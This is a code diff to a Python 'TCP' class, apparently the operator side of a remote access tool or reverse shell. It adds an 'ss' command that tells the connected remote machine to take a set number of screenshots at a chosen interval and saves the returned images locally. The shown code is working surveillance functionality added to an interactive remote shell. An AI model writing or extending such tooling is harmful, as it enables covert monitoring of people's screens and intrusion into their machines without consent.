@@ -922,6 +922,34 @@ class TCP:
         archivo.close()
         print(Fore.GREEN + "[+] Informacion guardada")
 
+    def screenShot(self, cmd):
+        params = self.parametros(cmd, r"(\s-[dnot]+[= ])")[0]
+        directorio = '.'
+        if '-o' in params.keys():
+            directorio = params['-o']
+        if not os.path.isdir(directorio):
+            os.mkdir(directorio)
+
+        n = 1
+        t = 0
+        if '-n' in params.keys():
+            n = int(params['-n'])
+        if '-t' in params.keys():
+            t = int(params['-t'])
+
+        if t < 1 and n > 1:
+            print(Fore.YELLOW + f"[!] El parametro '-t' debe ser mayor o igual a 1\nt es {t}")
+            return
+
+        self.__conexion.send(cmd.encode())
+
+        i = 0
+        while i < n:
+            ubicacion = f"{directorio}/ss{i}.png"
+            self.__conexion.recv(8)
+            self.recibirArchivo(ubicacion)
+            i += 1
+
     # Funcion para ingresar y evaluar comandos
     def shell(self):
         try:
@@ -1196,6 +1224,14 @@ class TCP:
 
                     except Exception as e:
                         print(Fore.RED + "[-] Error de proceso (save)")
+                        print(e)
+
+                elif cmd.lower()[:2] == "ss":
+                    try:
+                        self.screenShot(cmd)
+
+                    except Exception as e:
+                        print(Fore.RED + "[-] Error de proceso (ss)")
                         print(e)
 
                 # Si no hay una coincidencia, se envia el comando
